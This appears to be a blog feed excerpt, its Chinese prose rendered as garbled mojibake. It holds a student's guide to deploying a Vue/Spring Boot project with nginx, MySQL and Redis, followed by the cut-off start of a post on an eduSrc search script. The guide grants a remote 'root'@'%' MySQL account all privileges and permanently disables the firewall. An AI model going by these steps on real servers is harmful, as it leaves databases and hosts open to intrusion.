        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info no-icon flat"><p>æœ¬åœ°éƒ¨ç½²å‰åç«¯é¡¹ç›®ï¼Œè¯¾ç¨‹ä½œä¸šè¦æ±‚ï¼Œè®°ä¸€ä¸‹ç¬”è®°ï¼Œæ€•è‡ªå·±å¿˜äº†<br>é¡ºä¾¿ç»™å…¶ä»–åŒå­¦ä¸€ä¸ªæ€è·¯å§~ æœ‰ä»»ä½•é”™è¯¯ã€ç–‘é—®éƒ½å¯ä»¥æä¸€ä¸‹ï¼</p></div><h2 id="æ€è·¯">æ€è·¯</h2><p>ç”±äºéƒ¨ç½²çš„æ˜¯å‰åç«¯é¡¹ç›®ï¼Œæœ‰ä¸‰ç§æ–¹å¼ï¼š</p><ol><li><p>å‰åç«¯ä¸€èµ·éƒ¨ç½²</p><p>æ‰“åŒ…å‰ç«¯ä»£ç ç”Ÿæˆ<code>dist</code>æ–‡ä»¶å¤¹ï¼Œå°†distæ–‡ä»¶å¤¹ä¸­çš„å¤åˆ¶åˆ°åç«¯çš„<code>static</code>ä¸­ï¼Œç„¶åæ‰“åŒ…åç«¯ç”Ÿæˆ<code>jar</code>åŒ…ï¼Œç›´æ¥è¿è¡Œå³å¯ï¼ˆæ— éœ€å®‰è£…nginxï¼‰</p><p>ç®€å•ï¼Œä½†ä¸æ˜“ä¿®æ”¹ï¼Œä¸æå€¡ï¼ˆè‡ªå·±ä¹Ÿæ²¡è¯•æˆåŠŸå˜»å˜»ï¼‰</p></li><li><p>å‰åç«¯åˆ†ç¦»éƒ¨ç½²</p><p>å‰ç«¯åç«¯åˆ†åˆ«æ‰“åŒ…ï¼Œåˆ†åˆ«è¿è¡Œï¼Œå‰ç«¯æ˜¯é€šè¿‡<code>nginx</code>ä»£ç†çš„ï¼Œåç«¯å¯åŠ¨<code>jar</code>åŒ…ï¼Œå‰ç«¯çš„è¯·æ±‚ä½¿ç”¨nginxä»£ç†å‘é€åˆ°åç«¯ã€‚</p></li><li><p>å®å¡”é¢æ¿éƒ¨ç½²</p><p>é€‚ç”¨äºæ–°æ‰‹æ­å»ºï¼Œä¹‹å‰ç”¨è¿‡è¿˜æŒºå¿«ï¼Œå°±ä¸çŸ¥é“è€å¸ˆé‚£è¾¹è¿‡ä¸è¿‡å…³ï¼ˆdogeï¼‰</p><p>æ•™ç¨‹ï¼š</p><ul><li><a href="https://baijiahao.baidu.com/s?id=1666393487336913288&amp;wfr=spider&amp;for=pc">å¹²è´§é€Ÿç ï¼åˆå­¦è€…å¦‚ä½•å»ºç«‹ç½‘ç«™-æ­å»ºå®å¡”Linuxåå°é¢æ¿</a></li><li><a href="https://blog.csdn.net/qq_48922459/article/details/121901441">è®°Linuxä½¿ç”¨å®å¡”éƒ¨ç½²Vue+Springbootå‰åç«¯åˆ†ç¦»é¡¹ç›®</a></li></ul></li></ol><p>ä»¥ä¸‹æ˜¯ç¬¬äºŒç§æ–¹æ³•çš„æ­¥éª¤ğŸ‘‡</p><h2 id="å®éªŒè®¾å¤‡åŠéœ€æ±‚">å®éªŒè®¾å¤‡åŠéœ€æ±‚</h2><ul><li><p>å‰åç«¯é¡¹ç›®ä¸€ä»½ï¼ˆå‰ç«¯<code>Vue</code>ã€åç«¯<code>Spring</code>ï¼‰</p></li><li><p>VMè™šæ‹Ÿæœº</p><ul><li><code>Ubuntu</code>ä¸€å°ï¼ˆç”¨äºå­˜æ”¾å‰åç«¯ï¼ŒåŠè¿è¡Œç¯å¢ƒï¼‰</li><li><code>Centos7</code>ä¸¤å°ï¼ˆç”¨äºæ”¾ç½®æ•°æ®åº“å’ŒRedisï¼‰</li></ul></li></ul><div class="note primary flat"><p>è¿™é‡Œå› äººè€Œå¼‚ï¼Œæˆ‘åˆ†å¼€æ˜¯ä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œå¦‚æœå«Œéº»çƒ¦çš„è¯ï¼Œé›†æˆåˆ°ä¸€å°ä¸­ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p></div><h2 id="å‰ç«¯éƒ¨ç½²">å‰ç«¯éƒ¨ç½²</h2><h3 id="å®‰è£…nginx">å®‰è£…nginx</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_23832313/article/details/83578836">ubuntuå®‰è£…nginx</a></p><h4 id="å¯åŠ¨nginx">å¯åŠ¨nginx</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin    # è¿›å…¥nginxå¯åŠ¨ç›®å½•</span><br><span class="line">./nginx                     # å¯åŠ¨nginx</span><br><span class="line">æˆ–è€…</span><br><span class="line">service nginx start</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//é‡å¯å‘½ä»¤: å®‰è£…è·¯å¾„ä¸‹</span><br><span class="line">sudo /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æ˜¯å¦å¯åŠ¨">æŸ¥çœ‹æ˜¯å¦å¯åŠ¨</h4><p>å¯åŠ¨åæµè§ˆå™¨è®¿é—®è‡ªå·±çš„IPåœ°å€å³å¯è®¿é—®åˆ°ä¸‹é¢çš„é¡µé¢</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE.5l8wdcd6odw0.jpg" alt="æµè§ˆå™¨è®¿é—®"></p><p>æˆ–è€…ç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼Œå¦‚å›¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep nginx</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8.79u2nnhhtb80.jpg" alt="æŸ¥çœ‹nginxæ˜¯å¦å¯åŠ¨"></p><p>å‡ºç°ä»¥ä¸Šå³ä¸ºå¯åŠ¨æˆåŠŸ</p><div class="note default no-icon flat"><p>å°ç¬”è®°ï¼šubuntuè¿›å…¥rootæƒé™ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šè®¾ç½®rootå¯†ç ï¼Œè¦è®¾ç½®rootå¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root # æ›´æ¢rootå¯†ç </span><br></pre></td></tr></table></figure></div><h4 id="é€€å‡º">é€€å‡º</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nginx -s stop</span><br><span class="line">æˆ–</span><br><span class="line">./nginx -s quit</span><br></pre></td></tr></table></figure><h3 id="æ‰“åŒ…å‰ç«¯">æ‰“åŒ…å‰ç«¯</h3><p>æŠŠé¡¹ç›®ä¸­çš„åç«¯æ¥å£æ”¹æˆ<code>Ubuntu</code>çš„ip<br>ç»ˆç«¯è¾“å…¥<code>ifconfig</code>æŸ¥çœ‹ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build   # æ‰“åŒ…å‰ç«¯ç”Ÿæˆdistæ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆdistæ–‡ä»¶å¤¹ï¼ˆå‰ç«¯é™æ€æ–‡ä»¶ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%89%93%E5%8C%85%E5%89%8D%E7%AB%AF.3xo963pubvs0.jpg" alt="å‰ç«¯æ‰“åŒ…"></p><p>åœ¨Linuxçš„ç›®å½•ä¸‹ mkdir å»ºä¸€ä¸ªæ”¾æ‰“åŒ…æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼ˆè¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>/site/</code>ï¼‰</p><h3 id="nginxé…ç½®">nginxé…ç½®</h3><p>åœ¨<code>/usr/local/nginx/conf/nginx.conf</code>æ–‡ä»¶ä¸­æ·»åŠ ä»£ç ï¼Œæ·»åŠ ä½ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E9%85%8D%E7%BD%AEnginx.32sdjef7tgk.jpg" alt="é…ç½®nginx"></p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upstream javaboy.org&#123;</span><br><span class="line">        server 127.0.0.1:8090;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">location / &#123;</span><br><span class="line">                proxy_pass http://javaboy.org;</span><br><span class="line">                proxy_redirect default;</span><br><span class="line">        &#125;</span><br><span class="line">        location ~ .*\.(js|css|ico|png|jpg|eot|svg|ttf|woff|html) &#123;</span><br><span class="line">                #æ‰€æœ‰é™æ€æ–‡ä»¶ç›´æ¥è¯»å–ç¡¬ç›˜</span><br><span class="line">                root /site/dist/;</span><br><span class="line">                expires 30d; #ç¼“å­˜30å¤©</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é…ç½®å®Œåé‡å¯nginxå³å¯ã€‚</p><p>æµè§ˆå™¨è®¿é—®<code>http://your-ip/index.html</code> æŸ¥çœ‹æ•ˆæœ</p><div class="note info no-icon flat"><p>è§£é‡Šä¸€ä¸‹ä¸Šé¢æ·»åŠ çš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upstream javaboy.org&#123;</span><br><span class="line">    server 127.0.0.1:8090;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>javaboy.org</code>åªæ˜¯ä¸ªåå­—ï¼Œä½ éšä¾¿æ€ä¹ˆèµ·éƒ½å¯ä»¥ã€‚<br>åŒç†ï¼Œä¸‹é¢çš„<code>proxy_pass http://javaboy.org</code>ç”¨çš„å°±æ˜¯ä¸Šé¢çš„è¿™ä¸ªã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä½¿ç”¨nginxçš„é»˜è®¤çš„80ç«¯å£ï¼Œè®¿é—®è¿™ä¸ªæ¥å£çš„æ—¶å€™ï¼Œnginxå°±ä¼šç»™æŠŠè¯·æ±‚ä»£ç†åˆ°åç«¯çš„é‚£ä¸ª<code>8090</code>ç«¯å£ä¸Šã€‚</p><p><strong>æ³¨æ„</strong>ï¼šè¿™ä¸ª<code>8090</code>æ˜¯<code>åç«¯</code>é¡¹ç›®çš„ç«¯å£!!!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location ~ .*\.(js|css|ico|png|jpg|eot|svg|ttf|woff|html) &#123;</span><br><span class="line">    #æ‰€æœ‰é™æ€æ–‡ä»¶ç›´æ¥è¯»å–ç¡¬ç›˜</span><br><span class="line">    root /site/dist/;</span><br><span class="line">    expires 30d; #ç¼“å­˜30å¤©</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯è¯´ï¼Œä»¥ <code>js|css|ico|png|jpg|eot|svg|ttf|woff|html</code> è¿™ç§ç»“å°¾çš„é¡µé¢ï¼Œå°±ä¸ç”¨è¯·æ±‚åç«¯ï¼Œç›´æ¥å‰ç«¯å±•ç¤ºã€‚</p><p>é‚£ä¸‹é¢çš„<code>root /site/dist/</code>ï¼Œå°±æ˜¯æˆ‘ä¸Šé¢è¯´çš„æˆ‘çš„å‰ç«¯æ‰“åŒ…æˆçš„ dist åœ¨Linuxçš„ä½ç½®ï¼Œè¿™ä¸ªè¦æ”¹æˆä½ è‡ªå·±çš„å‰ç«¯æ‰“åŒ…æ–‡ä»¶ dist åœ¨Linuxçš„<code>ç»å¯¹è·¯å¾„</code>ã€‚</p><p>é…ç½®å®Œæˆä»¥åè®°å¾—è¦<code>é‡æ–°å¯åŠ¨nginx</code>ï¼Œé…ç½®æ–‡ä»¶æ‰ä¼š<code>ç”Ÿæ•ˆ</code>ã€‚</p></div><h2 id="åç«¯éƒ¨ç½²">åç«¯éƒ¨ç½²</h2><h3 id="å‡†å¤‡">å‡†å¤‡</h3><p>ä¿®æ”¹é¡¹ç›®ä¸­çš„<code>æ•°æ®åº“IP</code> ä¸º <code>æ•°æ®åº“æœåŠ¡å™¨IP</code>, å…¶ä»–ä¸å˜</p><h3 id="æ‰“åŒ…åç«¯é¡¹ç›®">æ‰“åŒ…åç«¯é¡¹ç›®</h3><p>ç‚¹å‡»IDEAå³ä¾§çš„<code>Maven</code> &gt; <code>package</code>ï¼Œå¦‚å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%89%93%E5%8C%85%E5%90%8E%E7%AB%AF1.1e6xg6xds3k0.jpg" alt="æ‰“åŒ…åç«¯1"></p><p>åœ¨<code>target</code>æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆ<code>jar</code>ï¼Œæˆ‘ä»¬éœ€è¦çš„ä¹Ÿæ­£æ˜¯è¿™ä¸ª<code>jaråŒ…</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%89%93%E5%8C%85%E5%90%8E%E7%AB%AF2.2t1o4trbg3y0.jpg" alt="æ‰“åŒ…åç«¯2"></p><h3 id="è¿è¡Œåç«¯">è¿è¡Œåç«¯</h3><p>å°†æ‰“åŒ…å¥½çš„<code>jaråŒ…</code>æ”¾å…¥ä¸Šé¢å»ºå¥½çš„æ–‡ä»¶å¤¹ä¸­</p><p>ç›´æ¥è¿è¡Œæ‰“åŒ…å¥½çš„åç«¯jaråŒ…ï¼Œ<code>è¿è¡Œæ—¥å¿—</code>ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œ<code>ctrl+C</code>å¯å…³é—­åç«¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx.jar</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar xxx.jar &amp;</span><br></pre></td></tr></table></figure><p><code>nohup</code> æ„æ€æ˜¯ä¸æŒ‚æ–­è¿è¡Œå‘½ä»¤,å½“è´¦æˆ·é€€å‡ºæˆ–ç»ˆç«¯å…³é—­æ—¶ï¼Œç¨‹åºä»ç„¶è¿è¡Œ</p><p>å½“ç”¨ <code>nohup</code> å‘½ä»¤æ‰§è¡Œä½œä¸šæ—¶ï¼Œç¼ºçœæƒ…å†µä¸‹è¯¥ä½œä¸šçš„æ‰€æœ‰è¾“å‡ºè¢«é‡å®šå‘åˆ°nohup.outçš„æ–‡ä»¶ä¸­ï¼Œé™¤éå¦å¤–æŒ‡å®šäº†è¾“å‡ºæ–‡ä»¶ã€‚</p><h2 id="æ•°æ®åº“éƒ¨ç½²">æ•°æ®åº“éƒ¨ç½²</h2><h3 id="Centos7ä¸‹è½½mysql8">Centos7ä¸‹è½½mysql8</h3><p>ğŸ‘‰ <a href="https://www.cnblogs.com/secretmrj/p/15600144.html">Linuxï¼šCentOS7å®‰è£…MySQL8ã€å®Œæ•´ã€‘</a>ï¼ˆæ¨èï¼‰ğŸ‘ˆ</p><p>é—®é¢˜è§£å†³ï¼Œå‚è€ƒä»¥ä¸‹æ–‡ç« ï¼š</p><ul><li><p><a href="https://blog.csdn.net/miaodichiyou/article/details/99289160">Failed to start mysqld.service: Unit not found</a></p></li><li><p><a href="https://blog.csdn.net/weixin_43404791/article/details/105174074">MySQLé—®é¢˜ï¼Unit mysqld.service could not be found.</a></p></li><li><p><a href="https://blog.csdn.net/sunshine_hanxx/article/details/105959381">æœ‰æ•ˆè§£å†³ERROR 2003 (HY000): Canâ€™t connect to MySQL server on â€˜localhostâ€™ (111)</a></p></li></ul><h3 id="MySQLå¯¼å‡ºsqlæ–‡ä»¶ï¼ˆWindowä¸‹ï¼‰">MySQLå¯¼å‡ºsqlæ–‡ä»¶ï¼ˆWindowä¸‹ï¼‰</h3><ol><li><p>ç»ˆç«¯å¯¼å‡º</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; mysqldump -u ç”¨æˆ·å -p æ•°æ®åº“å &gt; å¯¼å‡ºçš„æ–‡ä»¶å</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">C:\&gt; mysqldump -u root -p dbname &gt; E:\mysql\mydb.sql</span><br></pre></td></tr></table></figure></li><li><p>Navicatå¯¼å‡º</p><p>é€‰æ‹©è‡ªå·±è¦å¯¼å‡ºçš„<code>æ•°æ®åº“</code> -&gt; å³é”®é€‰æ‹©<code>è½¬å‚¨SQLæ–‡ä»¶</code> -&gt; é€‰æ‹©<code>ç»“æ„å’Œæ•°æ®</code></p></li></ol><h3 id="Mysqlå¯¼å…¥æ•°æ®åº“ï¼ˆLinuxä¸‹ï¼‰">Mysqlå¯¼å…¥æ•°æ®åº“ï¼ˆLinuxä¸‹ï¼‰</h3><ol><li><p>é¦–å…ˆè¿›å…¥<code>Mysql</code>ä¸­ï¼Œåˆ›å»ºç©ºæ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database dbname;</span><br></pre></td></tr></table></figure></li><li><p>å¯¼å…¥</p><p>æ–¹æ³•ä¸€ï¼šï¼ˆé¡»è¿›å…¥<code>Mysql</code>ä¸­ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use dbname;      # é€‰æ‹©æ•°æ®åº“</span><br><span class="line">mysql&gt; set names utf8;              # è®¾ç½®æ•°æ®åº“ç¼–ç </span><br><span class="line">mysql&gt; source /home/xxxx/dbname.sql;  # å¯¼å…¥æ•°æ®ï¼ˆæ³¨æ„sqlæ–‡ä»¶çš„è·¯å¾„ï¼‰</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šï¼ˆæ— é¡»è¿›å…¥<code>Mysql</code>ä¸­ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uç”¨æˆ·å -på¯†ç  æ•°æ®åº“å &lt; æ•°æ®åº“å.sql</span><br></pre></td></tr></table></figure></li></ol><h3 id="å…è®¸Mysqlè¿œç¨‹ç™»é™†">å…è®¸Mysqlè¿œç¨‹ç™»é™†</h3><p>å¦‚æœæ˜¯æœ¬æœºï¼Œè¿›å…¥mysqlç»ˆç«¯: <code>mysql -u [username] -p [password]</code></p><p>å¦‚æœæ˜¯è¿œç¨‹ä¸»æœºï¼Œè¿›å…¥mysqlç»ˆç«¯: <code>mysql -h [host] -u [username] -p [password]</code></p><p>æ‰§è¡Œä»¥ä¸‹ä»£ç ğŸ‘‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> è¿›å…¥æ•°æ®åº“mysql</span></span><br><span class="line">mysql &gt; use mysql;</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å½“å‰ç”¨æˆ·</span>              </span><br><span class="line">mysql &gt; select User,Host from user;</span><br><span class="line"><span class="meta">  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> åˆ›å»ºç”¨æˆ·</span></span><br><span class="line">mysql &gt; CREATE user &#x27;root&#x27;@&#x27;%&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> è®¾ç½®å¯†ç </span></span><br><span class="line">mysql &gt; ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;å¯†ç &#x27;; </span><br><span class="line"><span class="meta">#</span><span class="bash"> æˆæƒç”¨æˆ·æ‰€æœ‰æƒé™</span></span><br><span class="line">mysql &gt; GRANT ALL PRIVILEGES ON *.* TO &quot;root&quot;@&quot;%&quot;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> åˆ·æ–°æƒé™åˆ—è¡¨</span></span><br><span class="line">mysql &gt; flush privileges;</span><br></pre></td></tr></table></figure><p>è¿œç¨‹è¿æ¥å¯èƒ½å‡ºç°çš„é—®é¢˜ğŸ‘‡</p><p><a href="https://blog.csdn.net/weixin_34358365/article/details/85953746">Ubuntuè¿œç¨‹è¿æ¥MySQL(connection refused)è§£å†³æ–¹æ³•</a></p><h2 id="å…³é—­é˜²ç«å¢™">å…³é—­é˜²ç«å¢™</h2><p>å…³é—­é˜²ç«å¢™æ˜¯ä¸ºäº†è®©æœåŠ¡å™¨é—´èƒ½å¤Ÿäº’ç›¸è®¿é—®</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_47872288/article/details/119641300">ubuntu:é˜²ç«å¢™é…ç½®è¯¦ç»†è®²è§£ï¼ˆå…¨ï¼‰</a></p><p>å¯èƒ½ä¼šå‡ºç°çš„é”™è¯¯ï¼Œå‚è€ƒä¸‹é¢çš„æ–¹æ³• ğŸ‘‡</p><p><a href="https://www.cnblogs.com/EasonJim/p/6851007.html">Ubuntuä½¿ç”¨iptablesé…ç½®é˜²ç«å¢™æç¤ºï¼šunrecognized serviceï¼ˆUbuntué…ç½®iptablesé˜²ç«å¢™ï¼‰</a></p><p>é˜²ç«å¢™å¸¸ç”¨å‘½ä»¤</p><ol><li><p>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">æˆ–</span><br><span class="line">service iptables status</span><br></pre></td></tr></table></figure><div class="note default flat"><p>ç»¿è‰²<code>active</code>ä¸ºå·²å¼€å¯ï¼Œ<code>loaded</code>ä¸ºå·²å…³é—­</p></div></li><li><p>æš‚æ—¶å…³é—­é˜²ç«å¢™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">æˆ–</span><br><span class="line">service iptables stop</span><br></pre></td></tr></table></figure></li><li><p>æ°¸ä¹…å…³é—­é˜²ç«å¢™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable firewalld</span><br><span class="line">æˆ–</span><br><span class="line">chkconfig iptables off</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯é˜²ç«å¢™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable firewalld</span><br><span class="line">æˆ–</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure></li><li><p>æ°¸ä¹…å…³é—­åé‡å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æš‚æ—¶è¿˜æ²¡æœ‰è¯•è¿‡</span><br><span class="line">chkconfig iptables on</span><br></pre></td></tr></table></figure></li></ol><h2 id="Rediséƒ¨ç½²">Rediséƒ¨ç½²</h2><p>æŸ¥çœ‹ä¹‹å‰çš„åšå®¢è¿›è¡Œå®‰è£…ï¼š<a href="https://www.zeker.top/posts/9d3a5b2a/">Centos å®‰è£… Redis åŠç›¸å…³æ“ä½œ</a></p><p>Rediså®‰è£…ä¸æ˜¯å¾ˆéš¾ï¼Œæˆ‘è¿™é‡Œæ˜¯éƒ¨ç½²åˆ°äº‘æœåŠ¡å™¨ä¸Šçš„ï¼Œå¦‚æœæ²¡æœ‰ç”¨åˆ°Redisçš„å¯ä»¥ç›´æ¥è·³è¿‡äº†</p><h2 id="æœ€å">æœ€å</h2><p>é™„ä¸Šå®Œæˆéƒ¨ç½²çš„å›¾ç‰‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220315/%E6%9C%80%E7%BB%88.1rvjlrmximhs.jpg" alt="å®Œæˆéƒ¨ç½²"></p><div class="note warning flat"><p>æ—¶é—´æœ‰ç‚¹ç´§ï¼Œèµ¶å¿™å†™å‡ºè¿™ç¯‡æ–‡ç« ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜ä¼šåŠæ—¶æ›´æ–°çš„ï¼Œå¦‚æœæœ‰ä»€ä¹ˆä¸å¯¹çš„åœ°æ–¹è¿˜æœ›å¤§ä½¬ä»¬æŒ‡ç‚¹æŒ‡ç‚¹ï¼</p></div>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring boot </tag>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’ˆå¯¹eduSrcå¹³å°åˆ¶ä½œæœç´¢è„šæœ¬</title>
      <link href="/posts/7ee00516/"/>
      <url>/posts/7ee00516/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note default no-icon flat"><p>æ–°å¹´éš¾å¾—æ”¾æ¾ä¸€äº›ï¼Œé—²æ¥æ— äº‹ï¼Œæƒ³ç€å¥½ä¹…æ²¡ä¸Šeduæ¼æ´å¹³å°çœ‹çœ‹äº†ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆç¤¼å“ä¸Šæ¶ï¼Œé¡ºä¾¿æƒ³çœ‹çœ‹æœ‹å‹æ€ä¹ˆæ ·ï¼Œä½†å¥ˆä½•å¹³å°éƒ½æ²¡æœ‰æœç´¢åŠŸèƒ½â”­â”®ï¹â”­â”®ï¼ŒæŸ¥èµ·æ¥ä¹Ÿæä¸æ–¹ä¾¿ã€‚</p><p>äºæ˜¯å°±æŒ¤äº†ç‚¹æ—¶é—´éšä¾¿å†™äº†ä¸‹æœç´¢è„šæœ¬ï¼Œå†™çš„ä¸å¤šï¼Œéš¾åº¦ä¸å¤§ï¼Œä½†åŠŸèƒ½åŸºæœ¬åŒ…å«ï¼Œå†™å¾—ä¸å¥½çš„åœ°æ–¹è¿˜è¯·å¤§ä½¬ä»¬å¤šå¤šæŒ‡æ•™ã€‚</p></div><h1>è„šæœ¬æ¦‚è¿°</h1><p>æœ¬è„šæœ¬ä¸»è¦æ˜¯é’ˆå¯¹ä¸‰ä¸ªä¸åŒçš„æœç´¢å¯¹è±¡ï¼š<code>ç”¨æˆ·</code>ï¼Œ<code>ç¤¼å“</code>ä»¥åŠ<code>é«˜æ ¡</code>ã€‚</p><p>ä¿¡æ¯å¤„ç†ä¸Šï¼Œåˆ©ç”¨<code>Xpath</code>å’Œ<code>æ­£åˆ™è¡¨è¾¾å¼</code>å¯¹å…¶è¿›è¡Œä¸€ä¸ªå¯¹åº”ä¿¡æ¯çš„æœç´¢è·å–ï¼ŒåŸºæœ¬åŠŸèƒ½å®Œæ•´ï¼Œæä¾›<code>å¯è§†åŒ–æœç´¢è¿›åº¦</code>ã€‚</p><p>èœå•å¦‚ä¸‹å›¾ğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220208/eduSrc_img1.2altqjz2w5wk.jpg" alt="è„šæœ¬èœå•"></p><p><code>main</code>å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 